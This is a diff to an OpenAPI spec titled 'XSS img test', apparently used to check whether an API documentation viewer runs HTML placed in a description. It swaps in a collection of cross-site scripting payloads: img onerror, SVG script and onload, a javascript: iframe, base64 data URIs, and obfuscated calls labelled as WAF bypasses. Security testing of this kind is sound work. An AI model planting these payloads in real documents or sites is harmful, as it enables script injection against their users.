@@ -7,13 +7,43 @@ info:
   version: "1.0.0"
   title: XSS img test
   description: |
-    <img src="https://academy.avast.com/hubfs/New_Avast_Academy/Hackers/Hacker-Hero-a1.png" 
-         onclick="alert(2)" 
-         onerror="alert(3)">
-    <svg xmlns="http://www.w3.org/2000/svg" onload="alert('SVG XSS')">
-      <rect width="100" height="100" style="fill:blue;" />
+    <!-- Basic Image-Based XSS -->
+    <img src=x onerror=alert('XSS Image')>
+
+    <!-- SVG with JavaScript Execution -->
+    <svg xmlns="http://www.w3.org/2000/svg">
+      <script>
+        alert('SVG XSS');
+      </script>
     </svg>
-    data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==
+
+    <!-- SVG Using onload (Possible WAF Bypass) -->
+    <svg xmlns="http://www.w3.org/2000/svg" onload="eval('\u0061lert(document.domain)')">
+      <circle cx="50" cy="50" r="40" fill="red"/>
+    </svg>
+
+    <!-- JavaScript Execution via setTimeout -->
+    <svg xmlns="http://www.w3.org/2000/svg">
+      <script>
+        setTimeout('alert(1)', 100);
+      </script>
+    </svg>
+
+    <!-- Encoded JavaScript Execution -->
+    <svg xmlns="http://www.w3.org/2000/svg">
+      <script>
+        let a = String.fromCharCode(97, 108, 101, 114, 116);
+        window[a]('Bypassed WAF');
+      </script>
+    </svg>
+
+    <!-- iframe Injection -->
+    <iframe src="javascript:alert('iframe XSS')"></iframe>
+
+    <!-- Data URI Exploit -->
+    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ0RhdGEgVVJJIFhTUycpPC9zY3JpcHQ+PC9zdmc+" />
+
+    data:text/html;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ0Jhc3U2NCBYU1MpPC9zY3JpcHQ+PC9zdmc+
 paths:
   /accountId/1:
     get:
